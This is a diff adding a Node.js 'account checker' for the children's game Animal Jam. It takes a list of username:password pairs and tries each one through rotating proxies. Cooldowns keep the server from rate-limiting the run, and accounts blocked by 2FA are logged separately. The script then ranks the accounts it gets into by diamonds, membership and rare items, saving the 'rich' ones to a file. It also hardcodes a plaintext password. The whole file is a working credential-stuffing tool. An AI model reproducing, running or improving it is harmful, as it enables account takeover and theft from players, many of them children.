@@ -1,0 +1,785 @@
+/* 
+===========================================================
+🐾 Animal Jam Checker — Enhanced QoL Edition
+Original Script by: luna_zz
+Modified & Expanded by: marchvulture
+Enhanced Logging, Backups, Adaptive Waits, Safe Exit
+===========================================================
+*/
+
+// ============================================
+// 🧩 GLOBAL CONFIGURATION
+// ============================================
+const CONFIG = {
+  USE_PROXIES: true,            // 🌐 Enable proxy rotation from proxies.txt
+  QUIET_MODE: true,             // 🔇 Suppress chatty console logs (still logs to file)
+  ACCOUNT_DELETE_ENABLED: true, // 🗑️ Delete accounts after checking
+  HEARTBEAT_WAIT: 60,           // ❤️ Heartbeat wait time (seconds)
+  RETRY_LIMIT: 3,               // 🔁 Retries for UNKNOWN_LOGIN_ERROR
+  RETRY_DELAY: 2000,            // ⏳ Retry delay (ms)
+  COOLDOWN_AFTER_ACCOUNT: 14,   // ⏳ Cooldown after each account (seconds)
+  FAILURE_WINDOW_MS: 60000,     // ⏰ Sliding window for failure counts
+  FAILURE_THRESHOLD: 10,        // ⚠️ If recent failures exceed this, apply adaptive sleep
+  ADAPTIVE_SLEEP: 120000,       // 🧠 Adaptive cooldown duration (ms)
+  LOG_DIR: './checker-log',     // 📁 Directory for log files (auto-created)
+};
+
+// ============================================
+// 📦 Imports
+// ============================================
+import fs from 'fs';
+import path from 'path';
+import { readFile, writeFile, copyFile } from 'fs/promises';
+import { AnimalJamClient } from './animaljam.js/dist/index.js';
+import { blue, green, yellow, red, cyan } from 'colorette';
+import { loadJsonFile, loadJson, CheckClothWorth, sleep } from './utils.js';
+import readline from 'readline';
+
+// ============================================
+// 🧾 Logging: timestamped, daily-rotating file logs + quiet console
+// ============================================
+let activeLogDate = null;
+let LOG_PATH = null;
+
+function ensureLogDir() {
+  try { fs.mkdirSync(CONFIG.LOG_DIR, { recursive: true }); } catch (_) {}
+}
+
+function dateStamp() {
+  return new Date().toISOString().slice(0, 10); // YYYY-MM-DD
+}
+
+function refreshLogPathIfNeeded() {
+  const today = dateStamp();
+  if (activeLogDate !== today) {
+    activeLogDate = today;
+    LOG_PATH = path.join(CONFIG.LOG_DIR, `checker-${today}.txt`);
+    // Touch file to ensure it exists
+    try { fs.appendFileSync(LOG_PATH, ''); } catch (_) {}
+  }
+}
+
+function ts() {
+  return new Date().toLocaleTimeString();
+}
+
+const _consoleLog = console.log.bind(console);
+const _consoleError = console.error.bind(console);
+const _consoleWarn = console.warn.bind(console);
+
+function writeToLogFile(line) {
+  refreshLogPathIfNeeded();
+  try { fs.appendFileSync(LOG_PATH, line + '\n'); } catch (_) {}
+}
+
+function log(...args) {
+  // Build a string for file logging
+  const asText = args.map(a => (typeof a === 'string' ? a : String(a))).join(' ');
+  const line = `[${ts()}] ${asText}`;
+  writeToLogFile(line);
+  if (!CONFIG.QUIET_MODE) _consoleLog(line);
+}
+
+function logColor(colorFn, ...args) {
+  const asText = args.map(a => (typeof a === 'string' ? a : String(a))).join(' ');
+  const line = `[${ts()}] ${asText}`;
+  writeToLogFile(line);
+  if (!CONFIG.QUIET_MODE) _consoleLog(colorFn(line));
+}
+
+function banner(message, colorFn = (x) => x) {
+  const line = '-'.repeat(60);
+  const blob = `\n${line}\n${message}\n${line}`;
+  writeToLogFile(`[${ts()}] ${message}`);
+  if (!CONFIG.QUIET_MODE) _consoleLog(colorFn(blob));
+}
+
+// Initialize logging
+ensureLogDir();
+refreshLogPathIfNeeded();
+logColor(green, `📄 Logging to: ${LOG_PATH}`);
+
+// ============================================
+// 🌐 Proxies
+// ============================================
+let proxies = [];
+let proxyIndex = 0;
+
+try {
+  if (CONFIG.USE_PROXIES) {
+    const proxyFile = await readFile('proxies.txt', 'utf8');
+    proxies = proxyFile.split('\n').map(p => p.trim()).filter(Boolean);
+    logColor(green, `✅ Loaded ${proxies.length} proxies.`);
+    if (proxies.length) {
+      // Top-of-file proxy debug (comment to silence fully)
+// logColor(cyan, `🔍 Proxy debug active — first proxy: ${proxies[0].split(':')[0]}`);
+    }
+  } else {
+    logColor(yellow, '🌐 Proxy use disabled (CONFIG.USE_PROXIES = false).');
+  }
+} catch {
+  logColor(yellow, '⚠️ No proxies.txt file found — running without proxies.');
+}
+
+function getNextProxy() {
+  if (!CONFIG.USE_PROXIES || !proxies.length) return null;
+  const proxy = proxies[proxyIndex % proxies.length];
+  proxyIndex++;
+  return proxy;
+}
+
+// ============================================
+// 🔐 Heartbeat creds & constants
+// ============================================
+const HEARTBEAT_USER = "Officialvulture";
+const HEARTBEAT_PASS = "1590WindowsPin";
+
+const CLOTHING_PATH   = './defpacks/1000-clothing.json';
+const DENITEMS_PATH   = './defpacks/1030-denitems.json';
+const ENSTRINGS_PATH  = './defpacks/10230-enstrings.json';
+const PETS_PATH       = './defpacks/1046-pets.json';
+const ACCOUNTS_FILE   = 'accounts.txt';
+const RICH_FILE       = 'rich-accounts.txt';
+const BAD_FILE        = 'bad-accounts.txt';
+const CHECKED_FILE    = 'CheckedAccounts.txt';
+const MEMBER_FILE     = 'member-accounts.txt';
+
+
+// ============================================
+// 🩺 Heartbeat
+// ============================================
+async function checkServerStatus() {
+  const proxy = CONFIG.USE_PROXIES ? getNextProxy() : null;
+  const client = new AnimalJamClient({ proxy });
+  // Debug lines (keep commented for silent mode)
+  // if (proxy) logColor(cyan, `[HEARTBEAT] Using proxy: ${String(proxy).split(':')[0]}`);
+  try {
+    await client.flashvars.fetch();
+    const resp = await client.authenticator.login({ screen_name: HEARTBEAT_USER, password: HEARTBEAT_PASS });
+    return !!(resp.auth_token ?? resp.token);
+  } catch (e) {
+    // logColor(red, `[HEARTBEAT] Proxy failed: ${proxy ? String(proxy).split(':')[0] : 'none'} (${e.message})`);
+    return false;
+  }
+}
+
+async function waitForServers() {
+  let wasDown = false;
+  while (!(await checkServerStatus())) {
+    wasDown = true;
+    logColor(red, '[HEARTBEAT] Servers appear offline. Retrying...');
+    for (let i = CONFIG.HEARTBEAT_WAIT; i > 0; i--) {
+      process.stdout.write(`\r[HEARTBEAT] ${i}s remaining...   `);
+      await sleep(1000);
+    }
+    process.stdout.write("\r[HEARTBEAT] Done. Continuing...\n");
+  }
+  if (wasDown) logColor(blue, '[HEARTBEAT END] Servers stable again — resuming checks');
+}
+
+// ============================================
+// 💎 Item detection sets / ID's
+// ============================================
+const RARE_CLOTHING_IDS = new Set([50, 167, 215, 242, 243, 270, 276, 277, 279, 280, 282, 283, 
+284, 285,286, 300, 332, 344, 364, 367, 376, 416, 489, 490, 496, 566, 634, 635, 637, 674, 1399, 2931,
+757, 762, 759, 769, 770, 789, 800, 804, 813, 860, 876, 878, 930, 954, 979, 987, 988, 1112, 1130, 2929,
+1131, 1132, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1155, 1164, 1167, 1168, 1172, 1173, 1174, 1175, 1176, 
+1177, 1178, 1182, 1183, 1212, 1213, 1243, 1266, 1281, 1315, 1336, 1344, 1346, 1414, 1416, 2930,
+1463, 1498, 1504, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1643, 1664, 1798, 
+1800, 1801, 1802, 1839, 1999, 2041, 2042, 2043, 2044, 2045, 2046, 2047, 2048, 2049, 2050, 2051,
+2052, 2053, 2054, 2055, 2056, 2057, 2058, 2059, 2060, 2063, 2064, 2065, 2066, 2067, 2068, 2069, 
+2070, 2357, 2359, 2360, 2361, 2362, 2364, 2365, 2366, 2367, 2369, 2370, 2371, 2372, 2374, 2375, 
+2376, 2377, 2379, 2380, 2381, 2382, 2384, 2385, 2386, 2567, 2568, 2569, 2570, 2571, 2673, 2674, 
+2675, 2676, 2680, 2681, 2683, 2684, 2699, 2701, 2702, 2703, 2763, 2766, 2767, 2783, 2796, 2797, 
+2801, 2802, 2806, 2807, 2886, 2891, 3129, 3130, 3131, 3132, 3133, 3208, 3312, 3360, 3361, 3362, 
+3364, 3380, 3381, 3382, 3383, 3384, 3458, 3459, 3461, 3462, 3499, 3503, 3565, 3566, 3567, 3578, 
+3602, 3603, 3707, 3713, 3716, 3717, 3720, 3723, 3731, 3737, 3774, 3775, 3776, 3777, 3778, 3779, 
+3785, 3857, 3858, 3958, 3959, 4030, 4031, 4074, 4075, 4077]);
+const RARE_DENITEM_IDS  = new Set([12, 224, 225, 226, 324, 325, 437, 481,
+485, 681, 684, 695, 710, 726, 731, 752, 759, 827, 875, 923, 924, 945, 946, 958, 959, 
+1011, 1012, 1060, 1081, 1082, 1083, 1092, 1093, 1094, 1095, 1096, 1109, 1130, 1154, 1166, 1227, 1233,
+1236, 1237, 1238, 1239, 1240, 1241, 1304, 1305, 1314, 1404, 1410, 1445, 1468, 1475, 1483, 1486, 1487, 
+1495, 1511, 1512, 1519, 1526, 1527, 1526, 1530, 2603, 2599, 2504, 2487, 1285, 1280, 1281, 1306, 1228,
+1533, 1537, 1575, 1577, 1583, 1588, 1589, 1601, 1613, 1831, 1841, 1871, 1937, 
+1939, 2030, 2191, 2198, 2201, 2202, 2204, 2205, 2206, 2209, 2210, 2211, 2212,
+2213, 2302, 2303, 2304, 2337, 2353, 2358, 2360, 2400, 2437, 2438, 2514, 2519, 2520, 2522, 2523, 
+2642, 2664, 2716, 2772, 2776, 2792, 2920, 2952, 2980, 3013, 3014, 3134, 3176, 3206, 3207, 3252, 3253, 3394, 3395, 3396, 3397, 3398, 3399, 3401, 3402, 
+3404, 3405, 3406, 3514, 3525, 3547, 3744, 3927, 3963, 3968, 3970, 3971, 3972, 3975, 2675, 3496,
+3992, 3997, 4002, 4063, 4065, 4066, 4067, 4097, 4098, 4125, 4225, 4226, 4744, 4772, 4935, 5015, 5019, 2635, 
+2636, 2637, 2638, 2639, 2640, 2668, 2669, 2765, 2766, 2991, 3322, 3202, 3492, 3493, 3494, 3495]);
+
+const RARE_PET_IDS = new Set([46, 47, 48, 49, 50, 51, 56, 58, 59, 60, 61, 65, 66, 68, 72, 73, 83, 97, 106, 110, 113]);
+
+const RARE_KEYWORDS = [
+  'headdress','rare hot magenta','rare spiked collar','blackout','coal','rare spiked wristband','exclusive','terrace','lavender','slime green','rare bright','bright orange',
+  'bright red','cyan', 'whiteout'];
+
+function containsRareKeyword(name) {
+  if (!name) return false;
+  const lower = name.toLowerCase();
+  return RARE_KEYWORDS.some(keyword => lower.includes(keyword));
+}
+
+// ============================================
+// 📉 Failure tracking (for adaptive cooldown)
+// ============================================
+let failureTimestamps = [];
+function recordFailure() { failureTimestamps.push(Date.now()); }
+function getRecentFailures() {
+  const now = Date.now();
+  return failureTimestamps.filter(t => now - t < CONFIG.FAILURE_WINDOW_MS);
+}
+
+// ============================================
+// 🧾 Output helpers & file utilities
+// ============================================
+function formatLine(screen_name, password, diamonds, isMember, clothingRares, denRares, creationYear, petName) {
+  const main_width = 36;
+  const list = arr => (arr.length ? arr.join(', ') : 'none');
+
+  return [
+    `${screen_name}:${password}`.padEnd(main_width),
+    `diamonds:${String(diamonds).padEnd(3)}`,
+    `member:${isMember ? 'yes' : 'no'}`,
+    `created:${creationYear}`,
+    `clothing: ${list(clothingRares)}`,
+    `den: ${list(denRares)}`,
+    `pets: ${list(petName)}`
+  ].join(' | ');
+}
+
+async function loadAccounts() {
+  const file = await readFile(ACCOUNTS_FILE, 'utf8');
+  return file.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
+}
+
+async function markBadAccount(screen_name, password, reason) {
+  const line = `${screen_name}:${password} | ${reason}`;
+  const targetFile = reason === 'REQUIRES_2FA' ? '2fa-accounts.txt' : 'bad-accounts.txt';
+  await writeFile(targetFile, line + '\n', { flag: 'a' });
+}
+
+async function saveAccounts(accounts) {
+  await writeFile(ACCOUNTS_FILE, accounts.join('\n'), 'utf8');
+}
+
+async function appendOrReplaceLine(filePath, screen_name, newLine) {
+  let lines = [];
+  let updated = false;
+  try {
+    const raw = await readFile(filePath, 'utf8');
+    lines = raw.split('\n').map(l => l.trim()).filter(l => l);
+    lines = lines.map(line => {
+      if (line.startsWith(screen_name + ':')) {
+        updated = true;
+        return newLine;
+      }
+      return line;
+    });
+  } catch {}
+  if (!updated) lines.push(newLine);
+  await writeFile(filePath, lines.join('\n'), 'utf8');
+}
+
+async function askStartIndexWithTimeout(max, timeoutMs = 10000) {
+  return new Promise(resolve => {
+    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+    const timer = setTimeout(() => {
+      _consoleLog('\n⏱️ No input—starting at #1');
+      rl.close(); resolve(0);
+    }, timeoutMs);
+    rl.question(`Start at account #? (1-${max}) [default=1]: `, input => {
+      clearTimeout(timer); rl.close();
+      const idx = parseInt(input, 10);
+      resolve(isNaN(idx) || idx < 1 || idx > max ? 0 : idx - 1);
+    });
+  });
+}
+
+async function countdown(seconds) {
+  for (let i = seconds; i > 0; i--) {
+    process.stdout.write(green(`\r⏳ Waiting: ${i}s `));
+    await sleep(1000);
+  }
+  process.stdout.write('\r'.padEnd(30, ' ') + '\r');
+}
+
+// ============================================
+// 🔎 Account checker (uses proxy toggle here too)
+// ============================================
+async function checkAccount(screen_name, password, clothing, denitems, enstrings) {
+  let petName = [];
+  const proxy  = CONFIG.USE_PROXIES ? getNextProxy() : null;
+  const client = new AnimalJamClient({ proxy });
+
+  // --- Step 1: Try to fetch flashvars safely ---
+  let flashvars;
+  try {
+    flashvars = await client.flashvars.fetch();
+  } catch (err) {
+    console.error("⚠️ flashvars.fetch() failed:", err);
+    flashvars = null;
+  }
+
+  // --- Step 2: Verify flashvars object, apply fallback if invalid ---
+  if (!flashvars || typeof flashvars !== "object") {
+    console.error("⚠️ flashvars.fetch() returned invalid data (likely 404). Using fallback object.");
+
+    flashvars = {
+      smartfoxServer: "sfs-classic.animaljam.com",
+      blueboxServer:  "bbo-classic.animaljam.com",
+      mdUrl:          "https://jammercentral.animaljam.com/game/",
+      website:        "https://classic.animaljam.com/",
+      clientURL:      "https://ajcontent.akamaized.net/1803/ajclient.swf?v=1",
+      content:        "https://ajcontent.akamaized.net/",
+      deploy_version: "1803",
+      build_version:  "1",
+      smartfoxPort:   4001
+    };
+  }
+
+  // --- Step 3: Continue with login as before ---
+  let auth_token = null;
+
+  const recentFailures = getRecentFailures();
+  if (recentFailures.length >= 15) {
+    _consoleLog(red(`🔒 RATE LIMIT WARNING — ${recentFailures.length} failures in the last minute`));
+    _consoleLog(yellow(`⏳ Sleeping 60 seconds to avoid hammering the server...`));
+    await sleep(60000);
+  }
+
+  try {
+    const auth = await client.authenticator.login({ screen_name, password });
+
+    if (auth.auth_token) {
+      auth_token = auth.auth_token;
+    } else if (auth.banned || auth.error_code === 102) {
+      _consoleLog(red(`❌ ${screen_name} is banned`));
+      await markBadAccount(screen_name, password, 'BANNED');
+      recordFailure();
+      return { success: false, reason: 'BANNED' };
+    } else if (auth.error === 'invalid_password' || auth.error_code === 101) {
+      _consoleLog(red(`❌ Invalid password for ${screen_name}`));
+      await markBadAccount(screen_name, password, 'INVALID_PASSWORD');
+      recordFailure();
+      return { success: false, reason: 'INVALID_PASSWORD' };
+    } else if (auth.error_code === 106) {
+      _consoleLog(red(`❌ ${screen_name} is disabled`));
+      await markBadAccount(screen_name, password, 'DISABLED');
+      recordFailure();
+      return { success: false, reason: 'DISABLED' };
+    } else if (auth.error === 'pending_otp_confirmation') {
+      _consoleLog(red(`❌ ${screen_name} requires 2FA`));
+      await markBadAccount(screen_name, password, 'REQUIRES_2FA');
+      recordFailure();
+      return { success: false, reason: 'REQUIRES_2FA' };
+    } else {
+      _consoleLog(red(`❌ Unknown error for ${screen_name}`));
+      return { success: false, reason: 'UNKNOWN_LOGIN_ERROR' };
+    }
+  } catch (e) {
+    _consoleLog(red(`⚠️ Server error during login for ${screen_name}: ${e.message}`));
+    await markBadAccount(screen_name, password, 'SERVER_ERROR');
+    return { success: false };
+  }
+
+  // ✅ Step 4: Force correct SmartFox hostname (drop any 'lb-' prefix)
+  flashvars.smartfoxServer = "sfs-classic.animaljam.com";
+
+  // ✅ Step 5: Single networking connection using patched flashvars
+  const networking = await client.networking.createClient({
+    host: flashvars.smartfoxServer,
+    port: flashvars.smartfoxPort,
+    auth_token,
+    screen_name,
+    deploy_version: flashvars.deploy_version,
+  });
+
+  let userData        = null;
+  let nextpacket      = false;
+  const received      = { il: false, di: false };
+  const clothingRares = new Set();
+  const denRares      = new Set();
+
+  networking.on('message', async message => {
+    const msg = message.toMessage();
+    if (msg.includes('playerWallSettings')) {
+      try {
+        const jsonData = await loadJson(msg);
+        userData = jsonData?.b?.o?.params ?? null;
+        if (!userData) _consoleLog(red('⚠️ playerWallSettings received but missing params'));
+      } catch (e) {
+        _consoleLog(red(`⚠️ Failed to parse playerWallSettings: ${e.message}`));
+      }
+    }
+
+    const parts = msg.split('%');
+    if (parts[1] !== 'xt') return;
+    const cmd = parts[2];
+
+    // ---- Pets (pl)
+    if (cmd === 'pl') {
+      const reportedCount = parseInt(parts[6], 10) || 0;
+      _consoleLog(yellow(`🐾 PL packet reports ${reportedCount} pets`));
+
+      const startIndex = 9;
+      const rawData = parts.slice(startIndex).join('%');
+      const petBlocks = rawData.split('|');
+      const pets = await loadJsonFile(PETS_PATH);
+
+      let parsed = 0;
+      const petRares = new Set();
+
+      function getPetId(valueAsDecimal) {
+        const v = Number(valueAsDecimal) >>> 0;
+        return v & 0xFF;
+      }
+
+      for (const block of petBlocks) {
+        if (parsed >= reportedCount) break;
+        const trimmed = block.trim();
+        if (!trimmed) continue;
+
+        const fields = trimmed.split('%');
+        if (fields.length < 2) continue;
+
+        const packed = fields[1];
+        const petId = getPetId(getPetId(packed));
+
+        const def = pets[petId];
+        const name = def ? def.name : 'Unknown';
+
+        if (RARE_PET_IDS.has(petId) || containsRareKeyword(name)) {
+          _consoleLog(green(`💎 Rare pet detected: ID=${petId}, Name=${name}`));
+          petRares.add(name || `PetID:${petId}`);
+        }
+        parsed++;
+      }
+
+      for (const rare of petRares) petName.push(rare);
+    }
+
+    // ---- Den items (di)
+    if (cmd === 'di') {
+      const reportedCount = parseInt(parts[5], 10) || 0;
+      _consoleLog(yellow(`📦 DI packet reports ${reportedCount} items`));
+
+      let idx = 7;
+      let parsed = 0;
+      let guard = 0;
+      const MAX_GUARD = 20000;
+
+      while (parsed < reportedCount && idx + 4 < parts.length && guard++ < MAX_GUARD) {
+        let start = -1;
+        for (let j = idx; j + 4 < parts.length; j++) {
+          if (/^-?\d+$/.test(parts[j]) && /^-?\d+$/.test(parts[j + 1]) && parts[j + 4] === 'true') { start = j; break; }
+        }
+        if (start === -1) { _consoleLog(yellow('⚠️ Could not realign DI blocks using "true" marker — falling back')); break; }
+        if (start !== idx) idx = start;
+
+        const stride = 9;
+        const block = parts.slice(idx, idx + stride);
+        const slot = parseInt(block[0], 10);
+        const itemId = parseInt(block[1], 10);
+
+        if (Number.isNaN(slot) || Number.isNaN(itemId)) { idx += stride; parsed++; continue; }
+        if (itemId === 0) { _consoleLog(yellow(`⤷ Empty den slot at slot ${slot}`)); idx += stride; parsed++; continue; }
+
+        const def = denitems[itemId];
+        const name = def ? (enstrings[def.nameStrId] || def.abbrName) : null;
+        if (RARE_DENITEM_IDS.has(itemId)) {
+          _consoleLog(green(`💎 Rare den item detected (by ID): ${itemId}${name ? ' → ' + name : ''}`));
+          denRares.add(name || itemId);
+        }
+        idx += stride; parsed++;
+      }
+
+      if (parsed < reportedCount && idx + 1 < parts.length) {
+        _consoleLog(yellow(`🔁 Fallback linear scan from idx ${idx} to end...`));
+        let fallbackIdx = idx; let fallbackGuard = 0;
+        while (fallbackIdx + 1 < parts.length && fallbackGuard++ < MAX_GUARD) {
+          const slot = parseInt(parts[fallbackIdx], 10);
+          const itemId = parseInt(parts[fallbackIdx + 1], 10);
+          if (!Number.isNaN(slot) && !Number.isNaN(itemId)) {
+            if (itemId !== 0) {
+              const def = denitems[itemId];
+              const name = def ? (enstrings[def.nameStrId] || def.abbrName) : null;
+              if (RARE_DENITEM_IDS.has(itemId)) {
+                _consoleLog(green(`💎 Rare den item detected (by ID): ${itemId}${name ? ' → ' + name : ''}`));
+                denRares.add(name || itemId);
+              }
+            } else {
+              _consoleLog(yellow(`⤷ Empty den slot at slot ${slot}`));
+            }
+            fallbackIdx += 9;
+          } else {
+            fallbackIdx++;
+          }
+        }
+      }
+      received.di = true;
+    }
+
+    // ---- Clothing (il)
+    else if (cmd === 'il' && nextpacket) {
+      nextpacket = false;
+      const splits = msg.split('%');
+      let parsedCount = 0;
+
+      for (let i = 6; i < splits.length; i += 5) {
+        const id = splits[i];
+        if (!/^\d+$/.test(id)) continue;
+        if (parseInt(id, 10) < 10) continue;
+        const color = splits[i + 2];
+        if (!/^-?\d+$/.test(color)) continue;
+
+        const itemId = parseInt(id, 10);
+        const def = clothing[itemId];
+        const name = def ? def.name : null;
+        if (!def) continue;
+        parsedCount++;
+
+        if (RARE_CLOTHING_IDS.has(itemId) || (name && containsRareKeyword(name)) || (name && CheckClothWorth(name))) {
+          _consoleLog(cyan(`💎 Rare clothing item detected: ${itemId}${name ? ' → ' + name : ''}`));
+          clothingRares.add(name || itemId);
+        }
+      }
+
+      _consoleLog(yellow(`🔍 Parsed ${parsedCount} clothing items`));
+      received.il = true;
+    }
+  });
+
+  networking.on('ready', async () => {
+    let tries = 0;
+    while (!userData && tries++ < 20) await sleep(100);
+    await networking.sendXTMessage(['di', '-1']);
+    await networking.sendXTMessage(['pl', '-1', screen_name]);
+    await networking.sendXTMessage(['ad', '-1', screen_name, userData.perUserAvId, 1]);
+    nextpacket = true;
+    await networking.sendXTMessage(['il', '-1']);
+  });
+
+  await networking.connect();
+
+  let tries = 0;
+  while ((!userData || !received.di || !received.il) && tries++ < 60) await sleep(500);
+
+  if (!userData) {
+    _consoleLog(red(`❌ Failed to retrieve userData for ${screen_name}`));
+    networking.disconnect?.();
+    return { success: false, reason: 'NO_USERDATA' };
+  }
+
+  const createdAtTimestamp = Number(userData?.createdAt || 0) * 1000;
+  const creationYear = createdAtTimestamp ? new Date(createdAtTimestamp).getFullYear() : 'unknown';
+
+  networking.disconnect?.();
+
+  return {
+    success:       true,
+    screen_name,
+    diamonds:      Number(userData.diamondsCount ?? 0),
+    isMember:      userData.accountType === 2,
+    clothingRares: Array.from(clothingRares),
+    denRares:      Array.from(denRares),
+    creationYear,
+    petName,
+  };
+}
+
+// ============================================
+// 🚀 Main
+// ============================================
+
+// 🧾 Auto backup accounts.txt into checker-log folder with date-based filename + 7-day cleanup
+import { existsSync, mkdirSync, readdirSync, unlinkSync } from 'fs';
+
+async function backupAccountsFile() {
+  try {
+    const BACKUP_DIR = './checker-log';
+    if (!existsSync(BACKUP_DIR)) mkdirSync(BACKUP_DIR, { recursive: true });
+
+    const date = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
+    const backupPath = path.join(BACKUP_DIR, `accounts_backup_${date}.txt`);
+
+    // Delete backups older than 7 days
+    const files = readdirSync(BACKUP_DIR);
+    const cutoff = Date.now() - 7 * 24 * 60 * 60 * 1000;
+    for (const file of files) {
+      if (file.startsWith('accounts_backup_') && file.endsWith('.txt')) {
+        const match = file.match(/accounts_backup_(\d{4}-\d{2}-\d{2})/);
+        if (match) {
+          const fileDate = new Date(match[1]).getTime();
+          if (fileDate < cutoff) unlinkSync(path.join(BACKUP_DIR, file));
+        }
+      }
+    }
+
+    await copyFile('accounts.txt', backupPath);
+    console.log(blue(`💾 Accounts backed up to ${backupPath}`));
+  } catch (err) {
+    console.log(yellow(`⚠️ Backup skipped: ${err.message}`));
+  }
+}
+
+
+async function main() {
+  await backupAccountsFile(); // 🧾 Backup accounts file
+  const startTime = Date.now();
+
+  await waitForServers();
+
+  const clothing  = await loadJsonFile(CLOTHING_PATH);
+  const denitems  = await loadJsonFile(DENITEMS_PATH);
+  const enstrings = await loadJsonFile(ENSTRINGS_PATH);
+
+  let accounts = await loadAccounts();
+  const startIdx = await askStartIndexWithTimeout(accounts.length);
+  logColor(blue, `Starting ${startIdx + 1}/${accounts.length}`);
+
+  // Graceful exit handler to save progress
+  process.on('SIGINT', async () => {
+    logColor(red, '🛑 Interrupted — saving progress...');
+    try { await saveAccounts(accounts); logColor(green, '💾 Progress saved.'); }
+    catch (e) { logColor(red, `❌ Failed to save progress: ${e.message}`); }
+    process.exit(0);
+  });
+
+  const richSet   = new Set();
+  const memberSet = new Set();
+  const retryCounts = new Map();
+  let consecutiveUnknownFails = 0;
+
+  try { (await readFile(RICH_FILE, 'utf8')).split('\n').forEach(l => l && richSet.add(l.split(':')[0])); } catch {}
+  try { (await readFile(MEMBER_FILE, 'utf8')).split('\n').forEach(l => l && memberSet.add(l.split(':')[0])); } catch {}
+
+  let processedCount = 0;
+
+// ============================================
+// 🦊 Process accounts reliably (with deletion + clean logging)
+// ============================================
+let lastHeartbeat = 0;
+async function waitForServersCached() {
+  const now = Date.now();
+  const CACHE_WINDOW = 10 * 60 * 1000; // 10 minutes
+  if (now - lastHeartbeat < CACHE_WINDOW) return; // skip redundant heartbeat
+  await waitForServers();
+  lastHeartbeat = now;
+}
+
+const totalAccounts = accounts.length;
+
+for (let i = startIdx; i < accounts.length; i++) {
+  const [screen_name, password] = accounts[i].split(':');
+  processedCount++;
+  const progress = `${processedCount}/${totalAccounts}`;
+  _consoleLog(`\n=== Checking ${screen_name} (${progress}) ===`);
+
+  await waitForServersCached();
+
+  const result = await checkAccount(screen_name, password, clothing, denitems, enstrings);
+  const { success, reason } = result;
+
+  async function removeAccount(tag = "UNSPECIFIED") {
+    if (!CONFIG.ACCOUNT_DELETE_ENABLED) return;
+    try {
+      accounts.splice(i, 1);
+      i--;
+      await writeFile(ACCOUNTS_FILE, accounts.join('\n'), 'utf8');
+      logColor(blue, `🗑️ Removed ${screen_name} (${tag}) from accounts.txt`);
+      logColor(green, `✅ accounts.txt updated — ${accounts.length} remaining`);
+    } catch (err) {
+      logColor(red, `❌ Failed to delete ${screen_name}: ${err.message}`);
+    }
+  }
+
+  // 🩺 Handle unknown login error (likely server downtime)
+  if (reason === "UNKNOWN_LOGIN_ERROR") {
+    _consoleLog("\n=== Checking HEARTBEAT ===");
+    lastHeartbeat = 0;
+    while (true) {
+      try {
+        await waitForServers();
+        _consoleLog(green("Login successful! (Heartbeat confirmed)"));
+        break;
+      } catch (hbErr) {
+        _consoleLog(red(`⚠️ Heartbeat check failed (${hbErr.message}) — retrying in 90s...`));
+        await sleep(90 * 1000);
+      }
+    }
+
+    try {
+      _consoleLog(cyan(`🔁 Retrying ${screen_name} after server recovery...`));
+      const retryResult = await checkAccount(screen_name, password, clothing, denitems, enstrings);
+
+      if (retryResult.success) {
+        _consoleLog(green(`✅ ${screen_name} succeeded after retry!`));
+
+        const { diamonds, isMember, clothingRares, denRares, creationYear, petName } = retryResult;
+        const hasRarePets = petName.length > 0;
+        const hasRare = clothingRares.length > 0 || denRares.length > 0 || hasRarePets;
+        const isRich = diamonds >= 5 || hasRare;
+        const line = formatLine(screen_name, password, diamonds, isMember,
+                                clothingRares, denRares, creationYear, petName);
+
+        if (isMember || isRich) {
+          await appendOrReplaceLine(RICH_FILE, screen_name, line);
+          _consoleLog(green(`Logged ${isMember ? 'member' : 'rich'}: ${screen_name}`));
+        } else {
+          await appendOrReplaceLine('clean-accounts.txt', screen_name, `${screen_name}:${password}`);
+          _consoleLog(blue(`Logged clean: ${screen_name}`));
+        }
+
+        await removeAccount("PROCESSED");
+        await countdown(CONFIG.COOLDOWN_AFTER_ACCOUNT);
+        continue;
+      } else {
+        _consoleLog(red(`❌ ${screen_name} still failed after retry (${retryResult.reason || "NO_REASON"})`));
+      }
+    } catch (retryErr) {
+      _consoleLog(red(`❌ ${screen_name} retry failed: ${retryErr.message}`));
+    }
+
+    await countdown(20);
+    continue;
+  }
+
+  if (reason === "SERVER_ERROR") {
+    _consoleLog(yellow(`⚠️ ${screen_name}: server issue — keeping for retry later.`));
+    fs.appendFileSync("server_error_accounts.txt", `${screen_name}:${password}\n`);
+    await countdown(20);
+    continue;
+  }
+
+  if (!success) {
+    _consoleLog(red(`Removing ${screen_name} — ${reason || "NO_REASON"}`));
+    await removeAccount(reason || "UNKNOWN_FAIL");
+    await countdown(10);
+    continue;
+  }
+
+  // ✅ SUCCESS CASE
+  const { diamonds, isMember, clothingRares, denRares, creationYear, petName } = result;
+  const hasRarePets = petName.length > 0;
+  const hasRare = clothingRares.length > 0 || denRares.length > 0 || hasRarePets;
+  const isRich = diamonds >= 5 || hasRare;
+  const line = formatLine(screen_name, password, diamonds, isMember, clothingRares, denRares, creationYear, petName);
+
+  if (isMember || isRich) {
+    await appendOrReplaceLine(RICH_FILE, screen_name, line);
+    _consoleLog(green(`Logged ${isMember ? 'member' : 'rich'}: ${screen_name}`));
+  } else {
+    await appendOrReplaceLine('clean-accounts.txt', screen_name, `${screen_name}:${password}`);
+    _consoleLog(blue(`Logged clean: ${screen_name}`));
+  }
+
+  await removeAccount("PROCESSED");
+  await countdown(CONFIG.COOLDOWN_AFTER_ACCOUNT);
+}
+
+const elapsed = ((Date.now() - startTime) / 60000).toFixed(1);
+banner(`✅ Completed all accounts.\n⏱ Runtime: ${elapsed} min\n📄 Logs: ${LOG_PATH}`, green);
+}
+
+main().catch(e => _consoleError(red('Fatal error:'), e));
